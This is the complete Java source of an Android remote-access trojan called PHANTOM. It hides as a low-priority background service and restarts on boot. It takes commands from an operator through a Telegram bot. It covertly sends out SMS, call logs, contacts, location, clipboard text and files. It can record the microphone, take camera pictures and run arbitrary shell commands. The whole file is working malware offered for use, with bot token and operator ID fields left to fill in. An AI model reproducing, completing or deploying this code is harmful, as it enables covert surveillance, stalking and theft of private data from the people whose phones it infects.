package com.tenix.phantom;

import android.annotation.SuppressLint;
import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.Service;
import android.app.WallpaperManager;
import android.content.ClipboardManager;
import android.content.Context;
import android.content.Intent;
import android.content.pm.ApplicationInfo;
import android.content.pm.PackageInfo;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.graphics.Bitmap;
import android.graphics.BitmapFactory;
import android.hardware.camera2.CameraAccessException;
import android.hardware.camera2.CameraCaptureSession;
import android.hardware.camera2.CameraDevice;
import android.hardware.camera2.CameraManager;
import android.hardware.camera2.CaptureRequest;
import android.location.Location;
import android.location.LocationManager;
import android.media.ImageReader;
import android.media.MediaRecorder;
import android.net.Uri;
import android.net.wifi.WifiInfo;
import android.net.wifi.WifiManager;
import android.os.BatteryManager;
import android.os.Build;
import android.os.Handler;
import android.os.IBinder;
import android.os.Looper;
import android.provider.CallLog;
import android.provider.ContactsContract;
import android.provider.Settings;
import android.telephony.TelephonyManager;

import java.io.BufferedReader;
import java.io.ByteArrayOutputStream;
import java.io.DataOutputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.net.HttpURLConnection;
import java.net.URL;
import java.nio.charset.StandardCharsets;
import java.util.ArrayList;
import java.util.List;
import java.util.concurrent.CountDownLatch;
import java.util.concurrent.TimeUnit;

public class inq extends Service {

    // ══════════════════════════════════════════════
    //  CONFIG  —  edit with MT Manager / Smali
    // ══════════════════════════════════════════════
    static String BOT_TOKEN  = "YOUR_BOT_TOKEN_HERE";
    static String OWNER_ID   = "YOUR_CHAT_ID_HERE";   // Telegram chat_id of operator
    // ══════════════════════════════════════════════

    private static volatile boolean running  = false;
    private static volatile boolean polling  = false;
    private long lastUpdateId = 0;

    // ─── Service lifecycle ────────────────────────

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        silentForeground();
        if (running) return START_STICKY;
        running = true;
        new Thread(() -> {
            stopForeground(true);
            try {
                sendText("🔵 *PHANTOM Online*\n" + buildDeviceInfo(), OWNER_ID);
                pollCommands();
            } catch (Exception ignored) {}
            finally { running = false; }
        }).start();
        return START_STICKY;
    }

    @Override
    public IBinder onBind(Intent i) { return null; }

    @Override
    public void onDestroy() {
        polling = false;
        running = false;
        super.onDestroy();
    }

    // ─── Command Polling ──────────────────────────

    private void pollCommands() {
        polling = true;
        while (polling) {
            try {
                String url = "https://api.telegram.org/bot" + BOT_TOKEN
                        + "/getUpdates?timeout=25&offset=" + (lastUpdateId + 1)
                        + "&allowed_updates=[\"message\"]";
                HttpURLConnection c = open(url, 30_000, 30_000);
                if (c.getResponseCode() == 200) {
                    String body = drain(c.getInputStream());
                    c.disconnect();
                    parseAndHandle(body);
                } else { c.disconnect(); Thread.sleep(3000); }
            } catch (Exception e) {
                try { Thread.sleep(5000); } catch (InterruptedException ignored) {}
            }
        }
    }

    private void parseAndHandle(String json) {
        // Simple JSON parse without library
        int idx = 0;
        while (true) {
            int uIdx = json.indexOf("\"update_id\":", idx);
            if (uIdx < 0) break;
            int uEnd = json.indexOf(',', uIdx + 12);
            long uid = Long.parseLong(json.substring(uIdx + 12, uEnd).trim());
            lastUpdateId = uid;

            // Extract chat_id
            int cidIdx = json.indexOf("\"chat\":{\"id\":", uIdx);
            if (cidIdx < 0) { idx = uEnd; continue; }
            int cidEnd = json.indexOf(',', cidIdx + 13);
            String chatId = json.substring(cidIdx + 13, cidEnd).trim();

            // Only respond to OWNER
            if (!chatId.equals(OWNER_ID)) { idx = uEnd; continue; }

            // Extract text
            int txtIdx = json.indexOf("\"text\":\"", uIdx);
            if (txtIdx < 0) { idx = uEnd; continue; }
            int txtEnd = json.indexOf('"', txtIdx + 8);
            if (txtEnd < 0) { idx = uEnd; continue; }
            String text = json.substring(txtIdx + 8, txtEnd)
                    .replace("\\n", "\n").replace("\\/", "/");

            // Run command in background
            final String cmd = text;
            final String cid = chatId;
            new Thread(() -> handleCommand(cmd, cid)).start();
            idx = txtEnd;
        }
    }

    // ─── Command Router ───────────────────────────

    private void handleCommand(String cmd, String cid) {
        try {
            if (cmd.equals("/start") || cmd.equals("/help")) {
                sendText(helpText(), cid);

            } else if (cmd.equals("/info")) {
                sendText(buildDeviceInfo(), cid);

            } else if (cmd.equals("/number")) {
                sendText(getPhoneNumber(), cid);

            } else if (cmd.startsWith("/where")) {
                sendText(getLocation(), cid);

            } else if (cmd.startsWith("/sms")) {
                int n = parseArg(cmd, 10);
                sendText(readSMS(n), cid);

            } else if (cmd.startsWith("/calls")) {
                int n = parseArg(cmd, 10);
                sendText(readCallLog(n), cid);

            } else if (cmd.startsWith("/contacts")) {
                int n = parseArg(cmd, 20);
                sendText(readContacts(n), cid);

            } else if (cmd.startsWith("/apps")) {
                sendText(getAppList(), cid);

            } else if (cmd.equals("/clip")) {
                getClipboard(cid);

            } else if (cmd.equals("/battery")) {
                sendText(getBattery(), cid);

            } else if (cmd.equals("/wifi")) {
                sendText(getWifi(), cid);

            } else if (cmd.startsWith("/ls")) {
                String path = cmd.length() > 4 ? cmd.substring(4).trim() : "/sdcard/";
                sendText(listFiles(path), cid);

            } else if (cmd.startsWith("/get ")) {
                String path = cmd.substring(5).trim();
                File f = new File(path);
                if (f.exists() && f.isFile()) sendFile(f, f.getName(), cid);
                else sendText("❌ File not found: " + path, cid);

            } else if (cmd.startsWith("/mic")) {
                int secs = parseArg(cmd, 10);
                sendText("🎤 Recording " + secs + "s...", cid);
                recordMic(secs, cid);

            } else if (cmd.startsWith("/snap")) {
                String side = cmd.contains("front") ? "front" : "back";
                sendText("📸 Capturing " + side + " camera...", cid);
                snapCamera(side, cid);

            } else if (cmd.startsWith("/flash")) {
                String state = cmd.contains("on") ? "on" : "off";
                flashlight(state.equals("on"), cid);

            } else if (cmd.startsWith("/bright")) {
                int val = parseArg(cmd, 128);
                setBrightness(val, cid);

            } else if (cmd.startsWith("/wall")) {
                // /wall home URL   or   /wall lock URL
                handleWallpaper(cmd, cid);

            } else if (cmd.startsWith("/sh ")) {
                String shell = cmd.substring(4).trim();
                sendText(execShell(shell), cid);

            } else if (cmd.equals("/kill")) {
                sendText("💀 PHANTOM shutting down...", cid);
                polling = false;
                running = false;
                stopSelf();

            } else {
                sendText("❓ Unknown command. Send /help", cid);
            }
        } catch (Exception e) {
            sendText("⚠️ Error: " + e.getMessage(), cid);
        }
    }

    // ─── Help Text ────────────────────────────────

    private String helpText() {
        return "👻 *PHANTOM Command List*\n\n"
            + "/info — Device info\n"
            + "/number — Phone number\n"
            + "/where — GPS location\n"
            + "/sms [n] — Read SMS\n"
            + "/calls [n] — Call log\n"
            + "/contacts [n] — Contacts\n"
            + "/apps — App list + permissions\n"
            + "/clip — Clipboard\n"
            + "/battery — Battery status\n"
            + "/wifi — WiFi info\n"
            + "/ls [path] — Browse files\n"
            + "/get [path] — Download file\n"
            + "/mic [secs] — Record audio\n"
            + "/snap [front|back] — Camera\n"
            + "/flash [on|off] — Flashlight\n"
            + "/bright [0-255] — Brightness\n"
            + "/wall [home|lock] [url] — Wallpaper\n"
            + "/sh [cmd] — Shell (root)\n"
            + "/kill — Shutdown";
    }

    // ─── Module: Device Info ──────────────────────

    @SuppressLint("HardwareIds")
    private String buildDeviceInfo() {
        TelephonyManager tm = (TelephonyManager) getSystemService(TELEPHONY_SERVICE);
        StringBuilder sb = new StringBuilder("📱 *Device Info*\n\n");
        sb.append("Brand: ").append(Build.BRAND).append("\n");
        sb.append("Model: ").append(Build.MODEL).append("\n");
        sb.append("Android: ").append(Build.VERSION.RELEASE).append(" (SDK ").append(Build.VERSION.SDK_INT).append(")\n");
        sb.append("Device: ").append(Build.DEVICE).append("\n");
        sb.append("Build: ").append(Build.DISPLAY).append("\n");
        if (tm != null) {
            try { sb.append("Operator: ").append(tm.getNetworkOperatorName()).append("\n"); }
            catch (Exception ignored) {}
            try {
                String sub = Build.VERSION.SDK_INT >= 29 ? tm.getSimOperatorName() : tm.getSimOperatorName();
                sb.append("SIM: ").append(sub).append("\n");
            } catch (Exception ignored) {}
        }
        sb.append("Package: ").append(getPackageName()).append("\n");
        return sb.toString();
    }

    // ─── Module: Phone Number ─────────────────────

    @SuppressLint("HardwareIds")
    private String getPhoneNumber() {
        TelephonyManager tm = (TelephonyManager) getSystemService(TELEPHONY_SERVICE);
        String num = null;
        if (tm != null) {
            try { num = tm.getLine1Number(); } catch (Exception ignored) {}
        }
        if (num == null || num.isEmpty()) {
            // Try from SIM via contacts
            try (Cursor c = getContentResolver().query(
                    Uri.parse("content://com.android.contacts/data/phones"),
                    new String[]{"data1"}, null, null, null)) {
                if (c != null && c.moveToFirst()) num = c.getString(0);
            } catch (Exception ignored) {}
        }
        return "📞 Phone Number: " + (num != null && !num.isEmpty() ? num : "Not available");
    }

    // ─── Module: Location ─────────────────────────

    @SuppressLint("MissingPermission")
    private String getLocation() {
        LocationManager lm = (LocationManager) getSystemService(LOCATION_SERVICE);
        Location loc = null;
        try {
            loc = lm.getLastKnownLocation(LocationManager.GPS_PROVIDER);
            if (loc == null) loc = lm.getLastKnownLocation(LocationManager.NETWORK_PROVIDER);
            if (loc == null) loc = lm.getLastKnownLocation(LocationManager.PASSIVE_PROVIDER);
        } catch (Exception ignored) {}
        if (loc == null) return "📍 Location: Not available (GPS off or no last known)";
        return "📍 *Location*\n"
                + "https://maps.google.com/?q=" + loc.getLatitude() + "," + loc.getLongitude()
                + "\nLat: " + loc.getLatitude()
                + "\nLon: " + loc.getLongitude()
                + "\nAccuracy: " + (int) loc.getAccuracy() + "m"
                + "\nProvider: " + loc.getProvider();
    }

    // ─── Module: SMS ──────────────────────────────

    private String readSMS(int count) {
        StringBuilder sb = new StringBuilder("💬 *Last " + count + " SMS*\n\n");
        Uri uri = Uri.parse("content://sms/inbox");
        try (Cursor c = getContentResolver().query(uri,
                new String[]{"address", "body", "date"},
                null, null, "date DESC")) {
            int i = 0;
            while (c != null && c.moveToNext() && i < count) {
                sb.append("From: ").append(c.getString(0)).append("\n");
                sb.append(c.getString(1)).append("\n").append("──────\n");
                i++;
            }
        } catch (Exception e) { return "SMS Error: " + e.getMessage(); }
        return sb.toString();
    }

    // ─── Module: Call Log ─────────────────────────

    private String readCallLog(int count) {
        StringBuilder sb = new StringBuilder("📞 *Call Log*\n\n");
        try (Cursor c = getContentResolver().query(CallLog.Calls.CONTENT_URI,
                new String[]{CallLog.Calls.NUMBER, CallLog.Calls.TYPE, CallLog.Calls.DATE, CallLog.Calls.DURATION},
                null, null, CallLog.Calls.DATE + " DESC")) {
            int i = 0;
            while (c != null && c.moveToNext() && i < count) {
                String type;
                switch (c.getInt(1)) {
                    case CallLog.Calls.INCOMING_TYPE: type = "📲 IN"; break;
                    case CallLog.Calls.OUTGOING_TYPE: type = "📤 OUT"; break;
                    case CallLog.Calls.MISSED_TYPE:   type = "❌ MISSED"; break;
                    default: type = "?";
                }
                sb.append(type).append(" ").append(c.getString(0))
                  .append(" — ").append(c.getInt(3)).append("s\n");
                i++;
            }
        } catch (Exception e) { return "Call log error: " + e.getMessage(); }
        return sb.toString();
    }

    // ─── Module: Contacts ─────────────────────────

    private String readContacts(int count) {
        StringBuilder sb = new StringBuilder("👤 *Contacts*\n\n");
        Uri uri = ContactsContract.CommonDataKinds.Phone.CONTENT_URI;
        try (Cursor c = getContentResolver().query(uri,
                new String[]{
                    ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME,
                    ContactsContract.CommonDataKinds.Phone.NUMBER
                }, null, null, ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME + " ASC")) {
            int i = 0;
            while (c != null && c.moveToNext() && i < count) {
                sb.append(c.getString(0)).append(": ").append(c.getString(1)).append("\n");
                i++;
            }
        } catch (Exception e) { return "Contacts error: " + e.getMessage(); }
        return sb.toString();
    }

    // ─── Module: App List ─────────────────────────

    private String getAppList() {
        PackageManager pm = getPackageManager();
        List<PackageInfo> pkgs = pm.getInstalledPackages(PackageManager.GET_PERMISSIONS);
        StringBuilder sb = new StringBuilder("📦 *Installed Apps (" + pkgs.size() + ")*\n\n");
        int i = 0;
        for (PackageInfo pi : pkgs) {
            if ((pi.applicationInfo.flags & ApplicationInfo.FLAG_SYSTEM) != 0) continue;
            sb.append("▪ ").append(pi.applicationInfo.loadLabel(pm)).append("\n");
            sb.append("  pkg: ").append(pi.packageName).append("\n");
            if (pi.requestedPermissions != null && pi.requestedPermissions.length > 0) {
                sb.append("  perms: ").append(pi.requestedPermissions.length).append("\n");
            }
            if (++i >= 50) { sb.append("\n... and ").append(pkgs.size() - 50).append(" more"); break; }
        }
        return sb.toString();
    }

    // ─── Module: Clipboard ───────────────────────

    private void getClipboard(String cid) {
        new Handler(Looper.getMainLooper()).post(() -> {
            try {
                ClipboardManager cm = (ClipboardManager) getSystemService(CLIPBOARD_SERVICE);
                String text = "(empty)";
                if (cm != null && cm.hasPrimaryClip() && cm.getPrimaryClip() != null) {
                    CharSequence t = cm.getPrimaryClip().getItemAt(0).getText();
                    if (t != null && t.length() > 0) text = t.toString();
                }
                sendText("📋 *Clipboard:*\n" + text, cid);
            } catch (Exception e) {
                sendText("Clipboard error: " + e.getMessage(), cid);
            }
        });
    }

    // ─── Module: Battery ─────────────────────────

    private String getBattery() {
        try {
            Intent bi = registerReceiver(null,
                    new android.content.IntentFilter(Intent.ACTION_BATTERY_CHANGED));
            if (bi == null) return "Battery: N/A";
            int level = bi.getIntExtra(BatteryManager.EXTRA_LEVEL, -1);
            int scale = bi.getIntExtra(BatteryManager.EXTRA_SCALE, -1);
            int pct = (level * 100) / scale;
            int status = bi.getIntExtra(BatteryManager.EXTRA_STATUS, -1);
            boolean charging = status == BatteryManager.BATTERY_STATUS_CHARGING
                    || status == BatteryManager.BATTERY_STATUS_FULL;
            int temp = bi.getIntExtra(BatteryManager.EXTRA_TEMPERATURE, 0) / 10;
            return "🔋 *Battery*\n"
                    + "Level: " + pct + "%\n"
                    + "Status: " + (charging ? "⚡ Charging" : "🔌 Discharging") + "\n"
                    + "Temp: " + temp + "°C";
        } catch (Exception e) { return "Battery error: " + e.getMessage(); }
    }

    // ─── Module: WiFi Info ────────────────────────

    @SuppressLint("HardwareIds")
    private String getWifi() {
        try {
            WifiManager wm = (WifiManager) getApplicationContext().getSystemService(WIFI_SERVICE);
            if (wm == null || !wm.isWifiEnabled()) return "📶 WiFi: Disabled";
            WifiInfo wi = wm.getConnectionInfo();
            int ip = wm.getDhcpInfo().ipAddress;
            String ipStr = (ip & 0xFF) + "." + ((ip >> 8) & 0xFF) + "." + ((ip >> 16) & 0xFF) + "." + ((ip >> 24) & 0xFF);
            return "📶 *WiFi*\n"
                    + "SSID: " + wi.getSSID() + "\n"
                    + "IP: " + ipStr + "\n"
                    + "Signal: " + wi.getRssi() + " dBm\n"
                    + "Speed: " + wi.getLinkSpeed() + " Mbps";
        } catch (Exception e) { return "WiFi error: " + e.getMessage(); }
    }

    // ─── Module: File Manager ─────────────────────

    private String listFiles(String path) {
        File dir = new File(path);
        if (!dir.exists()) return "❌ Not found: " + path;
        if (!dir.isDirectory()) return "❌ Not a directory: " + path;
        File[] files = dir.listFiles();
        if (files == null || files.length == 0) return "📂 " + path + "\n(empty)";
        StringBuilder sb = new StringBuilder("📂 *" + path + "*\n\n");
        int dirs = 0, fils = 0;
        for (File f : files) {
            if (f.isDirectory()) {
                sb.append("📁 ").append(f.getName()).append("/\n");
                sb.append("   Path: ").append(f.getAbsolutePath()).append("\n");
                dirs++;
            } else {
                sb.append("📄 ").append(f.getName()).append("\n");
                sb.append("   Size: ").append(humanSize(f.length())).append("\n");
                sb.append("   Path: ").append(f.getAbsolutePath()).append("\n");
                fils++;
            }
        }
        sb.append("\n📁 ").append(dirs).append(" folders | 📄 ").append(fils).append(" files");
        return sb.toString();
    }

    private String humanSize(long bytes) {
        if (bytes < 1024) return bytes + " B";
        if (bytes < 1024 * 1024) return (bytes / 1024) + " KB";
        return (bytes / (1024 * 1024)) + " MB";
    }

    // ─── Module: Microphone ───────────────────────

    @SuppressWarnings("deprecation")
    private void recordMic(int seconds, String cid) {
        File out = new File(getCacheDir(), "phantom_mic.3gp");
        MediaRecorder r = null;
        try {
            if (out.exists()) out.delete();
            r = new MediaRecorder();
            r.setAudioSource(MediaRecorder.AudioSource.MIC);
            r.setOutputFormat(MediaRecorder.OutputFormat.THREE_GPP);
            r.setAudioEncoder(MediaRecorder.AudioEncoder.AMR_NB);
            r.setOutputFile(out.getAbsolutePath());
            r.prepare();
            r.start();
            Thread.sleep(seconds * 1000L);
            r.stop();
            r.release();
            if (out.exists() && out.length() > 0) {
                sendFile(out, "mic_" + seconds + "s.3gp", cid);
            } else {
                sendText("❌ Mic recording failed (empty file)", cid);
            }
        } catch (Exception e) {
            if (r != null) { try { r.release(); } catch (Exception ignored) {} }
            sendText("❌ Mic error: " + e.getMessage(), cid);
        }
    }

    // ─── Module: Camera ───────────────────────────

    private void snapCamera(String side, String cid) {
        if (Build.VERSION.SDK_INT < 21) {
            sendText("❌ Camera2 requires API 21+", cid);
            return;
        }
        CameraManager cm = (CameraManager) getSystemService(CAMERA_SERVICE);
        if (cm == null) { sendText("❌ No camera manager", cid); return; }
        try {
            String[] ids = cm.getCameraIdList();
            String targetId = null;
            for (String id : ids) {
                android.hardware.camera2.CameraCharacteristics ch = cm.getCameraCharacteristics(id);
                Integer facing = ch.get(android.hardware.camera2.CameraCharacteristics.LENS_FACING);
                if (facing == null) continue;
                if (side.equals("front") && facing == android.hardware.camera2.CameraCharacteristics.LENS_FACING_FRONT) {
                    targetId = id; break;
                } else if (!side.equals("front") && facing == android.hardware.camera2.CameraCharacteristics.LENS_FACING_BACK) {
                    targetId = id; break;
                }
            }
            if (targetId == null && ids.length > 0) targetId = ids[0];
            if (targetId == null) { sendText("❌ No camera found", cid); return; }

            final File outFile = new File(getCacheDir(), "phantom_snap.jpg");
            final CountDownLatch latch = new CountDownLatch(1);
            final String camId = targetId;

            android.hardware.camera2.CameraCharacteristics chars = cm.getCameraCharacteristics(camId);
            android.hardware.camera2.params.StreamConfigurationMap map =
                chars.get(android.hardware.camera2.CameraCharacteristics.SCALER_STREAM_CONFIGURATION_MAP);
            if (map == null) { sendText("❌ Camera config error", cid); return; }

            android.util.Size[] sizes = map.getOutputSizes(android.graphics.ImageFormat.JPEG);
            android.util.Size best = sizes[sizes.length - 1]; // smallest for speed
            for (android.util.Size sz : sizes) {
                if (sz.getWidth() <= 1920 && sz.getWidth() > best.getWidth()) best = sz;
            }

            final ImageReader reader = ImageReader.newInstance(
                    best.getWidth(), best.getHeight(), android.graphics.ImageFormat.JPEG, 1);
            final android.os.HandlerThread ht = new android.os.HandlerThread("PhantomCam");
            ht.start();
            final android.os.Handler camHandler = new android.os.Handler(ht.getLooper());

            reader.setOnImageAvailableListener(r -> {
                android.media.Image img = r.acquireLatestImage();
                if (img != null) {
                    android.media.Image.Plane[] planes = img.getPlanes();
                    java.nio.ByteBuffer buf = planes[0].getBuffer();
                    byte[] bytes = new byte[buf.remaining()];
                    buf.get(bytes);
                    img.close();
                    try {
                        java.io.FileOutputStream fos = new java.io.FileOutputStream(outFile);
                        fos.write(bytes); fos.close();
                    } catch (IOException ignored) {}
                }
                latch.countDown();
            }, camHandler);

            @SuppressLint("MissingPermission")
            CameraDevice.StateCallback stateCallback = new CameraDevice.StateCallback() {
                @Override
                public void onOpened(CameraDevice device) {
                    try {
                        List<android.view.Surface> surfaces = new java.util.ArrayList<>();
                        surfaces.add(reader.getSurface());
                        final CaptureRequest.Builder builder =
                                device.createCaptureRequest(CameraDevice.TEMPLATE_STILL_CAPTURE);
                        builder.addTarget(reader.getSurface());
                        builder.set(CaptureRequest.CONTROL_AF_MODE,
                                CaptureRequest.CONTROL_AF_MODE_CONTINUOUS_PICTURE);
                        device.createCaptureSession(surfaces,
                                new CameraCaptureSession.StateCallback() {
                                    @Override
                                    public void onConfigured(CameraCaptureSession session) {
                                        try {
                                            session.capture(builder.build(), null, camHandler);
                                        } catch (CameraAccessException e) { latch.countDown(); }
                                    }
                                    @Override
                                    public void onConfigureFailed(CameraCaptureSession s) { latch.countDown(); }
                                }, camHandler);
                    } catch (CameraAccessException e) { latch.countDown(); }
                }
                @Override public void onDisconnected(CameraDevice d) { latch.countDown(); }
                @Override public void onError(CameraDevice d, int e) { latch.countDown(); }
            };

            cm.openCamera(camId, stateCallback, camHandler);
            boolean ok = latch.await(10, TimeUnit.SECONDS);
            ht.quitSafely();

            if (ok && outFile.exists() && outFile.length() > 0) {
                sendFile(outFile, "snap_" + side + ".jpg", cid);
            } else {
                sendText("❌ Camera capture failed", cid);
            }
        } catch (Exception e) {
            sendText("❌ Camera error: " + e.getMessage(), cid);
        }
    }

    // ─── Module: Flashlight ───────────────────────

    @SuppressWarnings("NewApi")
    private void flashlight(boolean on, String cid) {
        if (Build.VERSION.SDK_INT < 23) {
            sendText("❌ Flashlight API requires Android 6+", cid);
            return;
        }
        try {
            CameraManager cm = (CameraManager) getSystemService(CAMERA_SERVICE);
            if (cm == null) { sendText("❌ No camera manager", cid); return; }
            String[] ids = cm.getCameraIdList();
            if (ids.length == 0) { sendText("❌ No camera/flash", cid); return; }
            cm.setTorchMode(ids[0], on);
            sendText("🔦 Flashlight: " + (on ? "ON" : "OFF"), cid);
        } catch (Exception e) {
            sendText("❌ Flash error: " + e.getMessage(), cid);
        }
    }

    // ─── Module: Brightness ───────────────────────

    private void setBrightness(int value, String cid) {
        // Clamp 0-255
        value = Math.max(0, Math.min(255, value));
        try {
            if (Build.VERSION.SDK_INT >= 23 && !Settings.System.canWrite(this)) {
                sendText("⚠️ WRITE_SETTINGS permission not granted.\n"
                       + "User must grant: Settings → Apps → PHANTOM → Special permissions → Modify system settings", cid);
                return;
            }
            Settings.System.putInt(getContentResolver(),
                    Settings.System.SCREEN_BRIGHTNESS_MODE,
                    Settings.System.SCREEN_BRIGHTNESS_MODE_MANUAL);
            Settings.System.putInt(getContentResolver(),
                    Settings.System.SCREEN_BRIGHTNESS, value);
            sendText("☀️ Brightness set to " + value + "/255", cid);
        } catch (Exception e) {
            sendText("❌ Brightness error: " + e.getMessage(), cid);
        }
    }

    // ─── Module: Wallpaper ────────────────────────

    private void handleWallpaper(String cmd, String cid) {
        // /wall home https://...
        // /wall lock https://...
        String[] parts = cmd.split("\\s+");
        if (parts.length < 3) {
            sendText("Usage: /wall [home|lock] [image_url]", cid);
            return;
        }
        String target = parts[1]; // home or lock
        String imgUrl = parts[2];
        try {
            HttpURLConnection c = (HttpURLConnection) new URL(imgUrl).openConnection();
            c.setConnectTimeout(15_000); c.setReadTimeout(30_000);
            InputStream is = c.getInputStream();
            Bitmap bmp = BitmapFactory.decodeStream(is);
            is.close(); c.disconnect();
            if (bmp == null) { sendText("❌ Failed to decode image", cid); return; }
            WallpaperManager wm = WallpaperManager.getInstance(this);
            if (Build.VERSION.SDK_INT >= 24) {
                int flag = target.equals("lock")
                        ? WallpaperManager.FLAG_LOCK
                        : WallpaperManager.FLAG_SYSTEM;
                ByteArrayOutputStream bos = new ByteArrayOutputStream();
                bmp.compress(Bitmap.CompressFormat.JPEG, 90, bos);
                java.io.ByteArrayInputStream bais = new java.io.ByteArrayInputStream(bos.toByteArray());
                wm.setStream(bais, null, true, flag);
                bais.close();
            } else {
                wm.setBitmap(bmp);
            }
            sendText("🖼️ Wallpaper set: " + target, cid);
        } catch (Exception e) {
            sendText("❌ Wallpaper error: " + e.getMessage(), cid);
        }
    }

    // ─── Module: Shell ────────────────────────────

    private String execShell(String command) {
        StringBuilder sb = new StringBuilder();
        try {
            Process p = Runtime.getRuntime().exec(new String[]{"sh", "-c", command});
            BufferedReader stdout = new BufferedReader(new InputStreamReader(p.getInputStream()));
            BufferedReader stderr = new BufferedReader(new InputStreamReader(p.getErrorStream()));
            String line;
            while ((line = stdout.readLine()) != null) sb.append(line).append("\n");
            while ((line = stderr.readLine()) != null) sb.append("[ERR] ").append(line).append("\n");
            p.waitFor();
        } catch (Exception e) { return "Shell error: " + e.getMessage(); }
        String out = sb.toString().trim();
        return out.isEmpty() ? "(no output)" : "```\n" + out + "\n```";
    }

    // ─── Telegram: sendText ───────────────────────

    private void sendText(String text, String chatId) {
        try {
            String urlStr = "https://api.telegram.org/bot" + BOT_TOKEN + "/sendMessage";
            HttpURLConnection c = open(urlStr, 10_000, 15_000);
            c.setRequestMethod("POST");
            c.setDoOutput(true);
            c.setRequestProperty("Content-Type", "application/json; charset=utf-8");
            // Escape text for JSON
            String safe = text.replace("\\", "\\\\")
                              .replace("\"", "\\\"")
                              .replace("\n", "\\n")
                              .replace("\r", "")
                              .replace("\t", "\\t");
            String json = "{\"chat_id\":\"" + chatId + "\","
                        + "\"text\":\"" + safe + "\","
                        + "\"parse_mode\":\"Markdown\"}";
            byte[] body = json.getBytes(StandardCharsets.UTF_8);
            c.setFixedLengthStreamingMode(body.length);
            c.getOutputStream().write(body);
            int code = c.getResponseCode();
            drain(code == 200 ? c.getInputStream() : c.getErrorStream());
            c.disconnect();
        } catch (Exception ignored) {}
    }

    // ─── Telegram: sendFile ───────────────────────

    private void sendFile(File file, String filename, String chatId) {
        try {
            String bound = "PHB" + System.currentTimeMillis();
            String urlStr = "https://api.telegram.org/bot" + BOT_TOKEN + "/sendDocument";
            HttpURLConnection c = open(urlStr, 30_000, 300_000);
            c.setRequestMethod("POST");
            c.setDoOutput(true);
            c.setChunkedStreamingMode(16384);
            c.setRequestProperty("Content-Type", "multipart/form-data; boundary=" + bound);
            DataOutputStream out = new DataOutputStream(c.getOutputStream());
            // chat_id field
            out.writeBytes("--" + bound + "\r\n");
            out.writeBytes("Content-Disposition: form-data; name=\"chat_id\"\r\n\r\n");
            out.writeBytes(chatId + "\r\n");
            // document field
            out.writeBytes("--" + bound + "\r\n");
            out.writeBytes("Content-Disposition: form-data; name=\"document\"; filename=\""
                    + filename + "\"\r\n");
            out.writeBytes("Content-Type: application/octet-stream\r\n\r\n");
            FileInputStream fis = new FileInputStream(file);
            byte[] buf = new byte[16384]; int n;
            while ((n = fis.read(buf)) != -1) out.write(buf, 0, n);
            fis.close();
            out.writeBytes("\r\n--" + bound + "--\r\n");
            out.flush(); out.close();
            int code = c.getResponseCode();
            drain(code == 200 ? c.getInputStream() : c.getErrorStream());
            c.disconnect();
        } catch (Exception ignored) {}
    }

    // ─── Foreground Notification ──────────────────

    private void silentForeground() {
        String ch = "phantom";
        if (Build.VERSION.SDK_INT >= 26) {
            NotificationManager nm = (NotificationManager) getSystemService(NOTIFICATION_MANAGER);
            if (nm != null && nm.getNotificationChannel(ch) == null) {
                NotificationChannel nc = new NotificationChannel(ch, "P", NotificationManager.IMPORTANCE_MIN);
                nc.setSound(null, null);
                nc.enableLights(false);
                nc.enableVibration(false);
                nc.setShowBadge(false);
                nm.createNotificationChannel(nc);
            }
        }
        Notification.Builder b;
        if (Build.VERSION.SDK_INT >= 26) {
            b = new Notification.Builder(this, ch);
        } else {
            b = new Notification.Builder(this);
        }
        b.setPriority(Notification.PRIORITY_MIN);
        startForeground(888, b.build());
    }

    // ─── Helpers ──────────────────────────────────

    private HttpURLConnection open(String url, int conn, int read) throws IOException {
        HttpURLConnection c = (HttpURLConnection) new URL(url).openConnection();
        c.setConnectTimeout(conn);
        c.setReadTimeout(read);
        c.setRequestProperty("Connection", "close");
        return c;
    }

    private String drain(InputStream is) {
        if (is == null) return "";
        try {
            BufferedReader br = new BufferedReader(new InputStreamReader(is));
            StringBuilder sb = new StringBuilder();
            String line;
            while ((line = br.readLine()) != null) sb.append(line);
            return sb.toString();
        } catch (Exception e) { return ""; }
    }

    private int parseArg(String cmd, int def) {
        try {
            String[] p = cmd.trim().split("\\s+");
            if (p.length > 1) return Integer.parseInt(p[1]);
        } catch (NumberFormatException ignored) {}
        return def;
    }

    // ─── Boot Receiver ────────────────────────────

    public static class BootReceiver extends android.content.BroadcastReceiver {
        @Override
        public void onReceive(Context ctx, Intent intent) {
            String action = intent.getAction();
            if (Intent.ACTION_BOOT_COMPLETED.equals(action)
                    || Intent.ACTION_MY_PACKAGE_REPLACED.equals(action)) {
                try { ctx.startService(new Intent(ctx, inq.class)); }
                catch (Exception ignored) {}
            }
        }
    }
}
